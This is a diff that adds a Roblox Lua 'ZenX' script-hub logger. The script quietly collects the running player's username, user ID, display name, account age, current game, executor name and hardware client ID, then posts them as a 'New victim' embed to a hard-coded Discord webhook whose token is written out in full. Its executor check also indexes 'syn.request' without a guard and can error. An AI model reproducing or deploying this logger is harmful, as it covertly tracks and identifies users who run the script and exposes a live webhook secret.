@@ -1,0 +1,85 @@
+-- Ultimate ZenX-style Logger (2025-2026 Edition)
+local Players = game:GetService("Players")
+local Http = game:GetService("HttpService")
+local Market = game:GetService("MarketplaceService")
+local plr = Players.LocalPlayer
+
+local webhook = "https://discord.com/api/webhooks/1425335602089300049/ZSJrWblCE4lJAZAj4Jq99H-8fXajhqXJ1kyX6qx_zViHFKPwMb9uzpBokaTe_BkTcLCx"
+
+local executor = (
+    getexecutorname and getexecutorname() or
+    identifyexecutor and identifyexecutor() or
+    syn and "Synapse X" or
+    syn.request and "Synapse X (Legacy)" or
+    Fluxus and "Fluxus" or
+    isfluxusclosure and "Fluxus" or
+    KRNL_LOADED and "Krnl" or
+    isexecutorclosure and "ScriptWare" or
+    getgc and "Celery" or
+    ishydrogenclosure and "Hydrogen" or
+    gethui and "Wave" or
+    is_trinity_executor and "Trinity" or
+    is_nebula_executor and "Nebula" or
+    is_comet_executor and "Comet" or
+    is_valyse_executor and "Valyse" or
+    getexploit and "Codex" or
+    is_sirhurt_closure and "Sirhurt" or
+    secure_load and "Sentinel" or
+    is_scylla_closure and "Scylla" or
+    isevon and "Evon" or
+    is_roexec and "Roexec" or
+    is_calypso and "Calypso" or
+    is_matx and "MatX" or
+    is_temple and "Temple" or
+    is_oxygen and "Oxygen" or
+    is_karma and "Karma" or
+    is_vega and "Vega X" or
+    is_jjsploit and "JJSploit" or
+    is_delta and "Delta" or
+    is_solara and "Solara" or
+    is_electron_executor and "Electron" or
+    is_arceus and "Arceus X" or
+    is_nihon and "Nihon" or
+    is_omega and "Omega" or
+    is_blackout and "Blackout" or
+    is_thunder and "Thunder" or
+    "Unknown / Paid / Custom Executor"
+)
+
+local gameName = "Unknown Game"
+pcall(function()
+    gameName = Market:GetProductInfo(game.PlaceId).Name
+end)
+
+local data = {
+    content = "",
+    embeds = {{
+        title = "ZENX • EXECUTION LOGGED",
+        description = "New victim just ran the script",
+        color = 16711680,
+        thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId="..plr.UserId.."&width=420&height=420&format=png"},
+        fields = {
+            {name = "Username",      value = plr.Name,                                                                     inline = true},
+            {name = "User ID",       value = "[`"..plr.UserId.."`](https://roblox.com/users/"..plr.UserId.."/profile)",           inline = true},
+            {name = "Display Name",  value = plr.DisplayName,                                                              inline = true},
+            {name = "Executor",      value = executor,                                                                     inline = true},
+            {name = "Game",          value = gameName.." (`"..game.PlaceId.."`)",                                          inline = true},
+            {name = "Account Age",   value = plr.AccountAge.." days old",                                                  inline = true},
+            {name = "HWID",          value = game:GetService("RbxAnalyticsService"):GetClientId(),                         inline = true},
+        },
+        footer = {text = "ZenX Script Hub v5 • "..os.date("%Y-%m-%d %X")},
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    }}
+}
+
+local req = syn and syn.request or http_request or request or Http.request or HttpPost
+if req then
+    pcall(function()
+        req({
+            Url = webhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = Http:JSONEncode(data)
+        })
+    end)
+end
